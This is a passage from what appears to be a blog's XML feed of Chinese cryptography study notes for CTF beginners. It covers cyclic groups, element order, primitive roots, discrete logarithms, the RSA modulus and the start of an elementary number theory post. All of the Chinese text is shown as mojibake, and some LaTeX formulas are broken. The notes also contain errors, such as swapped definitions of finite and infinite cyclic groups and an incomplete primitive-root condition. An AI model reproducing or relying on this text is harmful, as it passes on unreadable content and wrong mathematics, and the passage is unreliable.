theorem)"></a>ç¬¬ä¸€åŒæ„å®šç†(first isomorphism theorem)</h3><p>åˆç§°ï¼šåŸºæœ¬åŒæ€å®šç† (FHT, fundamental homomorphism theorem)</p><p>å®šç†ï¼šè®¾ç¾¤<script type="math/tex">(G,*)</script>å’Œç¾¤$( G^\prime , \otimes )$, $f{: }G\to G^\prime$ æ˜¯ç¾¤åŒæ€($åŒ<br>æ€æ ¸æ˜¯Kerfï¼ŒåŒæ€åƒæ˜¯Imf$),åˆ™</p><script type="math/tex; mode=display">G/Kerf\cong Imf</script><script type="math/tex; mode=display">\rho:[a]_{Kerf}\quad f(a)</script><hr><h2 id="å¾ªç¯ç¾¤-cyclic-group"><a href="#å¾ªç¯ç¾¤-cyclic-group" class="headerlink" title="å¾ªç¯ç¾¤(cyclic group)"></a>å¾ªç¯ç¾¤(cyclic group)</h2><p>å­©å­ä»¬ï¼Œå»å¾€ä¸Šå›å¿†ä¸€ä¸‹<strong>æ„é€ å­ç¾¤Â·æ–¹æ³•3</strong></p><p>å®šä¹‰ï¼šè®¾$G$æ˜¯ç¾¤ï¼Œ$g\in G$,å¦‚æœ</p><script type="math/tex; mode=display">G=<g>,</script><p>åˆ™ç§°$G$æ˜¯<strong>å¾ªç¯ç¾¤</strong>ï¼Œ$g$æ˜¯å¾ªç¯ç¾¤$G$çš„<strong>ç”Ÿæˆå…ƒ(generator)</strong>(å¯ä»¥æœ‰ä¸æ­¢ä¸€ä¸ªä¸ªç”Ÿæˆå…ƒ)ã€‚</p><ul><li><p><strong>æœ‰é™å¾ªç¯ç¾¤</strong>ï¼šç¾¤å…ƒç´ ä¸ªæ•°æ˜¯æ— é™çš„ï¼ŒåŒæ„äº$\mathbb{Z}$</p><p><strong>ä»»æ„æ— é™å¾ªç¯ç¾¤éƒ½åªæœ‰2ä¸ªç”Ÿæˆå…ƒ</strong></p></li><li><p><strong>æ— é™å¾ªç¯ç¾¤</strong>ï¼šç¾¤å…ƒç´ ä¸ªæ•°æ˜¯æœ‰é™çš„,åŒæ„äº$\mathbb{Z}_n$</p></li></ul><p><strong>å®šç†</strong>ï¼šä»»æ„å¾ªç¯ç¾¤éƒ½æ˜¯é˜¿è´å°”ç¾¤</p><p><strong>å®šç†</strong>ï¼šå¾ªç¯ç¾¤çš„å­ç¾¤æ˜¯å¾ªç¯ç¾¤</p><p><strong>å®šç†</strong>ï¼šè®¾$G$æ˜¯å¾ªç¯ç¾¤(ç”Ÿæˆå…ƒg)ï¼Œ$H$æ˜¯å…¶å­ç¾¤ï¼Œåˆ™å•†ç¾¤$G/H$æ˜¯å¾ªç¯ç¾¤(ç”Ÿæˆå…ƒ$[g]_H$)</p><h3 id="å¾ªç¯ç¾¤çš„åŒæ„"><a href="#å¾ªç¯ç¾¤çš„åŒæ„" class="headerlink" title="å¾ªç¯ç¾¤çš„åŒæ„"></a>å¾ªç¯ç¾¤çš„åŒæ„</h3><p>1.<script type="math/tex">\begin{aligned}\text{å¯¹äºæ— é™å¾ªç¯ç¾¤}G\text{çš„ä»»æ„å­ç¾¤}H\text{,éƒ½å­˜åœ¨å”¯ä¸€çš„é}\text{è´Ÿæ•´æ•°}m\text{,ä½¿å¾—}H=G^mã€‚\end{aligned}</script></p><p>2.<script type="math/tex">å¯¹äºné˜¶æœ‰é™å¾ªç¯ç¾¤Gçš„ä»»æ„å­ç¾¤H,éƒ½å­˜åœ¨nçš„å”¯ä¸€æ­£å› å­m,ä½¿å¾—H=G^m</script></p><hr><h2 id="å…ƒç´ çš„é˜¶-order"><a href="#å…ƒç´ çš„é˜¶-order" class="headerlink" title="å…ƒç´ çš„é˜¶(order)"></a>å…ƒç´ çš„é˜¶(order)</h2><p><strong>å®šä¹‰</strong>ï¼šè®¾$G$æ˜¯ç¾¤ï¼Œ$a\in G$,å¦‚æœ$n$æ˜¯æ»¡è¶³$a^n=e$çš„<strong>æœ€å°æ­£æ•´æ•°</strong>ï¼Œåˆ™ç§°$n$æ˜¯å…ƒç´ $a$çš„<strong>é˜¶</strong>ã€‚</p><blockquote><p>PS:å­˜åœ¨<strong>æ— é™é˜¶</strong>çš„å…ƒç´ </p></blockquote><p>æ€§è´¨$1:G$æ˜¯ç¾¤ï¼Œå…ƒç´ $a$çš„é˜¶æ˜¯$n$ (a$^n=e)$,åˆ™$\forall m\in Z$,æœ‰$n|m\Leftrightarrow a^m=e_0$</p><p>æ€§è´¨$2:$æœ‰é™å¾ªç¯ç¾¤çš„é˜¶æ˜¯$n$,åˆ™ç”Ÿæˆå…ƒ$g$çš„é˜¶ä¹Ÿæ˜¯$n$,ä¸”ç¾¤é‡Œå…ƒç´  $g,g^2,g^3,â€¦,g^n(=g^0=e)$å„ä¸ç›¸åŒã€‚</p><p>æ€§è´¨$3:$æ­£æ•´æ•°$d\mid n$, $n$é˜¶æœ‰é™å¾ªç¯ç¾¤æ°æœ‰å”¯ä¸€çš„$d$é˜¶å­ç¾¤$<g^\frac nd>$</g^\frac></p><p>æ€§è´¨$4:<script type="math/tex">n$é˜¶æœ‰é™å¾ªç¯ç¾¤</script><g><script type="math/tex">,</script>\forall k\in Z<script type="math/tex">,æœ‰</script>g^k<script type="math/tex">çš„é˜¶æ˜¯</script>\frac n{gcd(n,k)}$$</g></p><p>æ€§è´¨$5:$$n$é˜¶æœ‰é™å¾ªç¯ç¾¤æœ‰$\phi(n)$ ä¸ªç”Ÿæˆå…ƒã€‚</p><p>æ€§è´¨$6:$$G$æ˜¯æœ‰é™ç¾¤ï¼Œå…ƒç´ $a$çš„é˜¶æ˜¯$|G|$çš„å› å­ã€‚</p><p>æ€§è´¨$7:$ç´ æ•°é˜¶çš„ç¾¤å¿…ç„¶æ˜¯<strong>æœ‰é™å¾ªç¯ç¾¤</strong></p><p>æ€§è´¨$8:<script type="math/tex">$\begin{aligned}G\text{æ˜¯}n\text{é˜¶æœ‰é™å¾ªç¯ç¾¤,}d\text{æ˜¯}n\text{çš„æ­£å› å­,}G\text{é‡Œçš„}d\text{é˜¶}\text{å…ƒç´ ä¸€å…±æœ‰}\phi(d)\text{ä¸ªã€‚}\end{aligned}</script></p><hr><h2 id="åŸæ ¹-primitive-root"><a href="#åŸæ ¹-primitive-root" class="headerlink" title="åŸæ ¹(primitive root)"></a>åŸæ ¹(primitive root)</h2><p>ä¸å¦¨å…ˆå»å¤ä¹ ä¸€ä¸‹<strong>å·ä¸€(æ•°è®º)</strong>ä¸­çš„<strong>ä¹˜æ³•é˜¶</strong>æ¦‚å¿µ</p><p>$gä¸€èˆ¬è¡¨ç¤ºç”Ÿæˆå…ƒ$</p><p><strong>å®šä¹‰</strong>ï¼š$g\in\mathbb{Z},gcd(g,n)=1$,å¦‚æœ$ord_n(g)=\phi(n)$,ç§°$g$æ˜¯æ¨¡$n$ä¸‹çš„<strong>åŸæ ¹</strong>ã€‚</p><ul><li>$g$æ˜¯æ¨¡$n$ä¸‹çš„åŸæ ¹ï¼Œåˆ™$g^{ord_n(g)}\equiv g^{\phi(n)}\equiv1\left({\mathrm{mod~}}n\right)$ã€‚</li></ul><p>åŸæ ¹çš„é˜¶æ˜¯$\phi(n)$,<script type="math/tex">Z_n^*</script>çš„é˜¶ä¹Ÿæ˜¯$\phi(n)\Longrightarrow$åŸæ ¹æ˜¯<script type="math/tex">Z_n^*</script>çš„ç”Ÿæˆå…ƒ<script type="math/tex">\Longrightarrow\mathbb{Z}_n^*</script>æ˜¯å¾ªç¯ç¾¤</p><blockquote><script type="math/tex; mode=display">Z_n^*$$é‡Œï¼Œâ€œå…ƒç´ çš„é˜¶â€å°±æ˜¯å…ƒç´ çš„â€œä¹˜æ³•é˜¶â€æ¨¡$n$ä¸‹å­˜åœ¨åŸæ ¹çš„è¯ï¼Œ$$Z_n^*$$æ˜¯å¾ªç¯ç¾¤ï¼Œâ€œç”Ÿæˆå…ƒâ€å°±æ˜¯â€œåŸæ ¹â€$$(n=1,2,4,p^e,2p^e)</script></blockquote><p>$\forall k\in\mathbb{Z}\text{,}g^k\text{çš„ä¹˜æ³•é˜¶æ˜¯ }\frac{\phi(n)}{gcd(\phi(n),k)}$</p><script type="math/tex; mode=display">Z_p^*\text{é‡Œ,}\forall k\in Z\text{,}g^k\text{çš„ä¹˜æ³•é˜¶æ˜¯}\frac{p-1}{gcd(p-1,k)}</script><p>æ¨¡nä¸‹åŸæ ¹ä¸€å…±$\phi(\phi(n))$ä¸ª</p><script type="math/tex; mode=display">\mathbb{Z}_p^*\text{çš„ç”Ÿæˆå…ƒä¸€å…±}\phi(p-1)\text{ä¸ª}</script><h3 id="åŸæ ¹å­˜åœ¨çš„æ¡ä»¶"><a href="#åŸæ ¹å­˜åœ¨çš„æ¡ä»¶" class="headerlink" title="åŸæ ¹å­˜åœ¨çš„æ¡ä»¶"></a>åŸæ ¹å­˜åœ¨çš„æ¡ä»¶</h3><p>è®¾$p$æ˜¯<strong>å¥‡ç´ æ•°</strong>ï¼Œ$e$æ˜¯<strong>æ­£æ•´æ•°</strong><br>$n=1,2,4,p^e,2p^e$ æ—¶ï¼Œæ¨¡$n$ä¸‹å­˜åœ¨åŸæ ¹</p><script type="math/tex; mode=display">Z_p^*\text{é‡Œ,}\forall k\in Z\text{,}g^k\text{æ˜¯åŸæ ¹}\Leftrightarrow gcd(p-1,k)</script><h3 id="å¯»æ‰¾åŸæ ¹-ç”Ÿæˆå…ƒ-çš„ç®—æ³•"><a href="#å¯»æ‰¾åŸæ ¹-ç”Ÿæˆå…ƒ-çš„ç®—æ³•" class="headerlink" title="å¯»æ‰¾åŸæ ¹(ç”Ÿæˆå…ƒ)çš„ç®—æ³•"></a>å¯»æ‰¾åŸæ ¹(ç”Ÿæˆå…ƒ)çš„ç®—æ³•</h3><script type="math/tex; mode=display">\begin{aligned}&\forall a\in\mathbf{Z}_n^*\Longrightarrow ard_n(a)|\phi(n)\\&a\text{æ˜¯åŸæ ¹}\Longrightarrow ord_n(a)=\phi(n)\\&\text{è®¾ }\phi(n)=p_1^{e_1}...p_r^{e_r}\\&a\text{ä¸æ˜¯åŸæ ¹}\Longrightarrow\exists d|\phi(n),d<\phi(n),a^d=1 \pmod n\\&\Longrightarrow\exists p_j,d|\frac{\phi(n)}{p_j} \Longrightarrow\exists q,dq=\frac{\phi(n)}{p_j}\\&a^d\equiv1 \pmod n\Longrightarrow a^{\frac{\phi(n)}{p_j}}\equiv a^{dq}\equiv(a^d)^q\equiv1 \pmod n\end{aligned}</script><p><strong>ç®—æ³•1</strong>ï¼š</p><blockquote><p>step1.$å› å­åˆ†è§£\phi(n),æ±‚å‡ºå…¶å„ä¸ªç´ å› å­ p_1,â€¦,p_r$</p><p>step2.ä»»é€‰$a\in\mathbb{Z}_n^*$</p><p>step3.$if\ a^\frac{\phi(n)}{p_i} \not\equiv1(mod\: n),i=1,â€¦,r$</p><p>â€‹        output a</p><p>else goto step2.</p></blockquote><p><strong>ç®—æ³•2</strong>:<script type="math/tex">\text{å¦‚ä½•æ‰¾}Z_p^*\text{çš„åŸæ ¹(ç”Ÿæˆå…ƒ)}\\\text{è®¾ }p\text{ æ˜¯å¥‡ç´ æ•°,}\phi(p)=p-1=p_1^{t_1}...p_r^{t_r}</script></p><blockquote><p>for $i=1$â€‹ to $r$</p><p>{</p><p>do{</p><p>â€‹        ä»»é€‰$a\in Z_p^*$</p><p>} while $(a^{\frac{p-1}{p_i}}\equiv1$ (mod $p))$</p><p>$c_i\equiv a^{p_i{\frac{p-1}{t_i}}}\pmod p$</p><p>}</p><p>output $\prod_{i=1}^rc_i\pmod p$ </p><p><strong>å®šç†1</strong>ï¼šè®¾$G$æ˜¯ç¾¤ï¼Œ$c\in G$,å¯¹äºæŸä¸ªç´ æ•°$p$å’Œæ•´æ•°$t\geq1$,å¦‚æœ<br>$c^{p^t}=e$ ä½† $c^{p^{t-1}}\neq e$,åˆ™$c$çš„é˜¶æ˜¯$p^t$ã€‚</p><p><strong>å®šç†2</strong>ï¼šè®¾$G$æ˜¯ç¾¤ï¼Œ$c_1,c_2\in G$,$c_1,c_2$çš„é˜¶åˆ†åˆ«ä¸º$m_1,m_2$,ä¸”$gcd(\boldsymbol{m}_1,\boldsymbol{m}_2)=1$,åˆ™<script type="math/tex">c_1*c_2</script>çš„é˜¶æ˜¯$m_1m_2$ã€‚</p></blockquote><hr><h2 id="ç¦»æ•£å¯¹æ•°-discrete-logarithm"><a href="#ç¦»æ•£å¯¹æ•°-discrete-logarithm" class="headerlink" title="ç¦»æ•£å¯¹æ•°(discrete logarithm)"></a>ç¦»æ•£å¯¹æ•°(discrete logarithm)</h2><p>$n=1,2,4,p^e,2p^e$æ—¶ï¼Œå­˜åœ¨åŸæ ¹ (è®¾ä¸º$g),Z_n^*$æ˜¯å¾ªç¯ç¾¤</p><p><strong>å®šä¹‰</strong>ï¼š$gcd(a,n)=1$,å¿…å­˜åœ¨<strong>å”¯ä¸€æ•´æ•°</strong>$x(0\leq x&lt;\phi(n))$<br>æœ‰ $a\equiv g^{x}\pmod n$,åˆ™ç§°$x$æ˜¯ä»¥$g$ä¸ºåº•çš„$a$æ¨¡$n$çš„<strong>æŒ‡æ ‡</strong><br>(index)æˆ–<strong>ç¦»æ•£å¯¹æ•°(discrete logarithm)</strong>ã€‚</p><p>ç®€è®°ä¸ºï¼š$x=log_g(a)$</p><script type="math/tex; mode=display">1\equiv g^0(modn)\Longrightarrow log_g(1)=0\\g\equiv g^1(modn)\Longrightarrow log_g(g)=1</script><p><strong>å®šç†</strong>ï¼š$a\equiv g^r\pmod n\Leftrightarrow log_g(a)\equiv r\pmod{\phi(n)}$</p><blockquote><script type="math/tex; mode=display">\begin{aligned}\text{è®¾ }x=log_g(a), &\text{åˆ™ }a\equiv g^x(\mathrm{mod~}n) \\a\equiv g^r (mod n) &\Leftrightarrow g^x\equiv g^r\mathrm{~}(mod\mathrm{~}n) \\&\Leftrightarrow x\equiv r\pmod{\phi(n)} \\&\Leftrightarrow log_g(a)\equiv r\pmod{\phi(n)}\end{aligned}</script></blockquote><p><strong>æ€§è´¨1</strong>:$log_g(ab)\equiv log_g(a)+log_g(b)\pmod {\phi(n)}$</p><p><strong>æ€§è´¨2</strong>:$log_g(a^m)\equiv m\times log_g(a)\pmod {\phi(n)}$</p><p><strong>æ€§è´¨3</strong>:$log_h(a)\equiv log_h(g)\times log_g(a)\pmod {\phi(n)}$</p><h3 id="ç¦»æ•£å¯¹æ•°é—®é¢˜-DLP-discrete-logarithm-problem"><a href="#ç¦»æ•£å¯¹æ•°é—®é¢˜-DLP-discrete-logarithm-problem" class="headerlink" title="ç¦»æ•£å¯¹æ•°é—®é¢˜(DLP,discrete logarithm problem)"></a>ç¦»æ•£å¯¹æ•°é—®é¢˜(DLP,discrete logarithm problem)</h3><p><strong>å®šä¹‰</strong>ï¼šè®¾$G$æ˜¯å¾ªç¯ç¾¤ï¼Œ$g\in G$æ˜¯ç”Ÿæˆå…ƒï¼Œå¯¹äº$y\in G$å’Œæ­£<br>æ•´æ•°$x$,æœ‰ $y=g^x$,åˆ™ç¦»æ•£å¯¹æ•°é—®é¢˜å®šä¹‰ä¸ºï¼š<br>ç»™å®š$y$å’Œ$g$,æ±‚$x (=log_g(y))$ã€‚</p><p>ç›®å‰æ— é«˜æ•ˆç®—æ³•</p><hr><h2 id="RSAçš„æ¨¡æ•°"><a href="#RSAçš„æ¨¡æ•°" class="headerlink" title="RSAçš„æ¨¡æ•°"></a>RSAçš„æ¨¡æ•°</h2><p>RSAçš„æ‰€æœ‰è®¡ç®—éƒ½æ˜¯åœ¨$\mathbb{Z}_n^*$ä¸Šè¿›è¡Œçš„</p><p>$n=pq$</p><p>$\phi(n)=\phi(pq)=\phi(p)\phi(q)=(p-1)(q-1)$</p><p>$\forall a\in \mathbb{Z}_n^*,ord_n(a)\mid (p-1)(q-1)$</p><p>$è®¾\lambda(n)=lcm(p-1,q-1)&lt;(p-1)(q-1)$</p><p>$\mathbb{Z}_n^*æ²¡æœ‰åŸæ ¹ï¼ˆç”Ÿæˆå…ƒï¼‰ï¼Œä¸æ˜¯å¾ªç¯ç¾¤$</p><p><strong>å®šç†</strong>ï¼š<script type="math/tex">\mathbb{Z}_n^*ä¸­ä»»æ„å…ƒç´ çš„é˜¶éƒ½æ˜¯\lambda(n)çš„å› å­</script></p><script type="math/tex; mode=display">\mathbb{Z}_n^*$$ä¸­æ²¡æœ‰åŸæ ¹(ç”Ÿæˆå…ƒ)ï¼Œä¸æ˜¯å¾ªç¯ç¾¤$$Z_p^*$$å’Œ$$Z_q^*$$éƒ½æ˜¯å¾ªç¯ç¾¤ (å› ä¸º$p$å’Œ$q$æ˜¯ç´ æ•°ï¼Œæ»¡è¶³äº”ç§æƒ…å†µä¹‹ä¸€)$$\mathbb{Z}_p^*$$é‡Œå…ƒç´ æœ€å¤§é˜¶ä¸º$p-1$$$Z_q^*$$é‡Œå…ƒç´ æœ€å¤§é˜¶ä¸º$q-1$$$\mathbb{Z}_n^*$$é‡Œå…ƒç´ æœ€å¤§é˜¶ä¸º$\lambda(n)$**ç»“è®º**ï¼š$$Z_n^*$$çš„é˜¶æ˜¯$\phi(n)$,å…ƒç´ æœ€å¤§é˜¶ä¸º$\lambda(n)$$$\forall a\in Z_n^*$$,ç”±$ord_p(a)$å’Œ$ord_\mathfrak{q}(a)$å¦‚ä¸‹è®¡ç®—$ord_n(a):$$$ord_n(a)=lcm(ord_p(a),ord_q(a))</script><blockquote><p><strong>æ³¨æ„</strong>ï¼šæœ‰çš„<script type="math/tex">a\in\mathbb{Z}_n^*</script>,     $a$çš„é˜¶$ord_n(\boldsymbol{a})=\lambda(\boldsymbol{n})$,ä½†æ˜¯<br>$ord_p(a)&lt;p-1$å’Œ/æˆ–$ord_q(a)&lt;q-1$</p></blockquote><hr><h2 id="è¡¥å……ï¼šç¾¤çš„ä½“ç³»"><a href="#è¡¥å……ï¼šç¾¤çš„ä½“ç³»" class="headerlink" title="è¡¥å……ï¼šç¾¤çš„ä½“ç³»"></a>è¡¥å……ï¼šç¾¤çš„ä½“ç³»</h2><p><strong>å¹¿ç¾¤(groupoid)</strong>ï¼š<script type="math/tex">(A,*)</script>ï¼Œä»…æ»¡è¶³<strong>å°é—­æ€§</strong></p><p><strong>åŠç¾¤(semigroup)</strong>ï¼š<script type="math/tex">(A,*)</script>ï¼Œæ»¡è¶³å°é—­æ€§ï¼Œ<strong>ç»“åˆå¾‹</strong></p><p><strong>å¹ºåŠç¾¤(monoid,ç‹¬å¼‚ç‚¹)</strong>ï¼š<script type="math/tex">(A,*)</script>ï¼Œæ»¡è¶³å°é—­æ€§ï¼Œç»“åˆå¾‹ï¼Œæœ‰<strong>å•ä½å…ƒ(å¹ºå…ƒ)</strong></p><p><strong>ç¾¤(group)</strong>ï¼š<script type="math/tex">(A,*)</script>ï¼Œæ»¡è¶³å°é—­æ€§ï¼Œç»“åˆå¾‹ï¼Œæœ‰å•ä½å…ƒ(å¹ºå…ƒ)ï¼Œæ¯ä¸ªå…ƒç´ éƒ½æœ‰<strong>é€†å…ƒ</strong></p><p><strong>é˜¿è´å°”ç¾¤</strong>ï¼š<script type="math/tex">(A,*)</script>ï¼Œæ»¡è¶³å°é—­æ€§ï¼Œç»“åˆå¾‹ï¼Œæœ‰å•ä½å…ƒ(å¹ºå…ƒ)ï¼Œæ¯ä¸ªå…ƒç´ éƒ½æœ‰é€†å…ƒï¼Œè¿ç®—è¿˜æ»¡è¶³<strong>äº¤æ¢å¾‹</strong></p><p><strong>å¾ªç¯ç¾¤</strong>ï¼šå…·æœ‰ç”Ÿæˆå…ƒçš„<strong>é˜¿è´å°”ç¾¤</strong></p><hr><h1 id="å®Œç»“æ’’èŠ±"><a href="#å®Œç»“æ’’èŠ±" class="headerlink" title="å®Œç»“æ’’èŠ±"></a>å®Œç»“æ’’èŠ±</h1><p>â˜…,Â°<em>:.â˜†(ï¿£â–½ï¿£)/$:</em>.Â°â˜…<em> ã€‚<em>*çˆ±æ¥è‡ªğŸ˜½C.A.TğŸ˜¸å–µ</em></em></p>]]></content>
      
      
      <categories>
          
          <category> Cryptoæ•°å­¦åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
            <tag> æŠ½è±¡ä»£æ•° </tag>
            
            <tag> ç­‘åŸºç¯‡ </tag>
            
            <tag> ç¾¤è®º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç­‘åŸºç¯‡Â·åˆç­‰æ•°è®º</title>
      <link href="/2024/07/30/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/"/>
      <url>/2024/07/30/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·ä¸€ï¼ˆåˆç­‰æ•°è®ºï¼‰"><a href="#å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·ä¸€ï¼ˆåˆç­‰æ•°è®ºï¼‰" class="headerlink" title="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·ä¸€ï¼ˆåˆç­‰æ•°è®ºï¼‰"></a><strong>å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·ä¸€ï¼ˆåˆç­‰æ•°è®ºï¼‰</strong></h2><hr><h3 id="è¯´åœ¨å‰é¢"><a href="#è¯´åœ¨å‰é¢" class="headerlink" title="è¯´åœ¨å‰é¢"></a>è¯´åœ¨å‰é¢</h3><p>åœ¨å­¦ä¹ ã€æ¯”èµ›çš„è¿‡ç¨‹ä¸­ï¼Œæ„Ÿè§‰æ²¡æœ‰æ•°ç«åŸºç¡€çš„åŒå­¦å…¥å‘CryptoçœŸçš„å¾ˆç—›è‹¦ï¼Œå¾ˆå¤š<strong>æ¦‚å¿µå’Œç¬¦å·</strong>éƒ½ä¸æ‡‚ã€‚</p><p>æ‰€ä»¥åœ¨æ­¤åˆ†äº«è‡ªå·±çš„æ•°å­¦åŸºç¡€å­¦ä¹ ç¬”è®°(ä¹å¹´åˆ¶ä¹‰åŠ¡æ•™è‚²éƒ½èƒ½çœ‹å¾—æ‡‚çš„é‚£ç§ï¼Œå»ºè®®åŠ å…¥ä¸­è€ƒğŸ˜€),å› ä¸ºéƒ½æ˜¯åŸºç¡€çŸ¥è¯†ï¼Œå°±å‘½åä¸ºã€Šç­‘åŸºç¯‡ã€‹å§ï¼Œå¸Œæœ›èƒ½å‡è½»å¤§å®¶å…¥å‘å¯†ç çš„ç—›æ„Ÿï¼Œå¤§å®¶ä¸€èµ·å¿«ä¹çš„å­¦ä¹ å§ï¼ï¼ï¼</p><p>å½“ç„¶ï¼Œçœ‹æˆ‘è¿™ç¯‡ç¬”è®°è‚¯å®šæ˜¯ä¸å¤Ÿçš„ï¼Œæœ‰äº›è¯æ˜è¿‡ç¨‹æˆ‘ä¹Ÿæ˜¯ç›´æ¥çœç•¥äº†ï¼Œå¤§å®¶è¿˜æ˜¯è¦æŠŠå¯†ç å­¦æ¶‰åŠåˆ°çš„å…¨éƒ¨çŸ¥è¯†ç³»ç»Ÿçš„å­¦ä¹ ä¸€éï¼Œå¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯<strong>å­¦ä¼šåŠ¨ç¬”ï¼</strong>ã€‚</p><p>å¦‚æœä»¥åæˆ‘æ¶¦åˆ«çš„æ–¹å‘äº†ï¼Œä¹Ÿç®—ç»™è‡ªå·±çš„CTFçš„Cryptoç”Ÿæ¶¯ä¸€ä»½ç»“æœã€‚</p><p>å¦‚æœæœ‰é”™è¯¯ä¹Ÿ<strong>æ³è¯·å¤§å®¶æŒ‡æ­£</strong>ï¼Œçˆ±æ¥è‡ªNJUSTã€‚</p><p><strong>é‚£ä¹ˆï¼Œç­‘åŸºç¯‡ï¼Œæ­£å¼å¼€å§‹!!!!!</strong></p><blockquote><p>PS1ï¼šç”±äºå„äººç¼–è¾‘å™¨çš„ä½¿ç”¨ä¹ æƒ¯å·®å¼‚ï¼Œç¬¦å·å­—æ¯ä¹Ÿæ˜¯markdownå…¬å¼ç¼–è¾‘æ‰‹æ“å‡ºæ¥çš„ï¼Œå‘å¸ƒå‡ºæ¥çš„å…¬å¼æ¸²æŸ“å¯èƒ½ä¼šå‡ºä¸€ç‚¹ç‚¹å°é—®é¢˜ï¼Œå¤§å®¶å¤šåŒ…æ¶µï¼Œ<strong>å¯¹äºæ¸²æŸ“ä¸å‡ºæ¥çš„å…¬å¼ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±å¤åˆ¶åˆ°typoraé‡Œçœ‹</strong>ğŸ˜€ã€‚</p><p>PS2ï¼šç¼–è¾‘å™¨å’Œæˆ‘ä¸ªäººæ°´å¹³å·®çš„ç¼˜æ•…ï¼Œå¯èƒ½æ’ç‰ˆã€å†…å®¹é¡ºåºæ‚ä¹±ï¼Œå¤§å®¶è½»ç‚¹å–·</p><p>PS3ï¼šæœ‰ä¿®æ”¹å»ºè®®çš„è¯å¯ä»¥å‘é‚®ä»¶æemail: <strong>Cucumber0703@outlook.com</strong> ,çœ‹åˆ°åä¼šå…‰é€Ÿæ»‘è½¨ä¿®æ”¹çš„</p></blockquote><hr><h1 id="åˆç­‰æ•°è®º"><a href="#åˆç­‰æ•°è®º" class="headerlink" title="åˆç­‰æ•°è®º"></a>åˆç­‰æ•°è®º</h1><hr><h2 id="æ•´é™¤æ€§ï¼ˆDivisibilityï¼‰"><a href="#æ•´é™¤æ€§ï¼ˆDivisibilityï¼‰" class="headerlink" title="æ•´é™¤æ€§ï¼ˆDivisibilityï¼‰"></a>æ•´é™¤æ€§ï¼ˆDivisibilityï¼‰</h2><script type="math/tex; mode=display">\begin{flalign*}b|a:&è®¾a,bâˆˆ\mathbb{Z}ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªqâˆˆ\mathbb{Z}\\&ä½¿å¾—a=qbï¼Œåˆ™ç§°â€œbæ•´é™¤aâ€ï¼Œè®°ä¸ºâ€œ\ b|a\ "\\&(æˆ–ç§°ï¼šbæ˜¯açš„å› å­ï¼Œaæ˜¯bçš„å€æ•°ï¼Œaè¢«bæ•´é™¤)\\&&\end{flalign*}\\</script><script type="math/tex; mode=display">\begin{flalign*}b\nmid aï¼š&bä¸èƒ½æ•´é™¤a(aä¸èƒ½è¢«bæ•´é™¤\\&b|a \iff a=qb\\&&\end{flalign*}\\</script><script type="math/tex; mode=display">\begin{flalign*}&å¯¹äºä»»æ„a,b,câˆˆ\mathbb{Z}ï¼Œæœ‰ï¼š\\&(1)b|0\\&(2)1|a\\&(3)0|a\iff a=0 (éƒ¨åˆ†æ•™æè¯´æ˜bå¯ä¸º0ï¼Œç”±äºåœ¨å®šä¹‰ä¸­ä¸ºä¹˜æ³•å…³ç³»a=qbï¼Œæ•…è™½ç„¶aè¢«bæ•´é™¤ï¼Œbä¾æ—§å¯ä¸º0)\\&(4)b|a\iff b|-a \iff -b|a\\&(5)b|aä¸”a|bå½“ä¸”ä»…å½“a=Â±bï¼Œç‰¹åˆ«åœ°ï¼Œa|1å½“ä¸”ä»…å½“a=Â±1\\&&\end{flalign*}\\</script><ul><li>(è‡ªåæ€§)  $a|a$</li><li>(ä¼ é€’æ€§)  $b|aä¸”a|c,åˆ™b|c$</li><li>(ç›¸ä¹˜æ€§)  $b|aï¼Œåˆ™bc|ac$</li><li>(æ¶ˆå»æ€§)  $bc|acä¸”câ‰ 0ï¼Œåˆ™b|a$</li><li>(çº¿æ€§æ€§)  $b|aä¸”b|cï¼Œå¯¹äºæ‰€æœ‰s,tâˆˆ\mathbb{Z},éƒ½æœ‰b|(saÂ±tc)$</li><li>(æ¯”è¾ƒæ€§)  $å¦‚æœa,bâˆˆ\mathbb{N}ä¸”b|ï¼Œåˆ™bâ‰¤a$</li></ul><blockquote><p>ç»ƒä¹ é¢˜1ï¼š</p><p>è¯æ˜å¯¹äºä»»ä½•è‡ªç„¶æ•°ï¼Œè®©å…¶å„ä½ä¸Šçš„æ•°å­—ç›¸åŠ ä¹‹å’Œå¦‚æœèƒ½è¢«3æ•´é™¤ï¼Œé‚£ä¹ˆè¿™ä¸ªè‡ªç„¶æ•°ä¹Ÿå¯ä»¥è¢«3æ•´é™¤</p></blockquote><hr><h2 id="ç´ æ•°ï¼ˆPrimeï¼‰"><a href="#ç´ æ•°ï¼ˆPrimeï¼‰" class="headerlink" title="ç´ æ•°ï¼ˆPrimeï¼‰"></a>ç´ æ•°ï¼ˆPrimeï¼‰</h2><ul><li><p>å®šä¹‰ï¼š$è®¾nâˆˆ\mathbb{N}ä¸”nâ‰¥2ï¼Œé™¤äº†1å’Œnä»¥å¤–ï¼Œæ²¡æœ‰å…¶ä»–æ­£æ•´æ•°æ•´é™¤nï¼Œnç§°ä½œâ€œç´ æ•°â€(é€šå¸¸ç”¨pè¡¨ç¤º)ï¼›å¦åˆ™ï¼Œnç§°ä½œâ€œåˆæ•°â€$</p><blockquote><p>PSï¼š$1æ—¢ä¸æ˜¯ç´ æ•°ä¹Ÿä¸æ˜¯åˆæ•°$</p><p>PSï¼š$nä¸ºåˆæ•°ï¼Œåˆ™n=abï¼Œå…¶ä¸­1&lt;a&lt;nï¼Œ1&lt;b&lt;n$</p></blockquote></li></ul><h3 id="å¼•ç†ï¼šä»»ä½•å¤§äº1çš„æ•´æ•°å¿…æœ‰ç´ å› å­ã€‚"><a 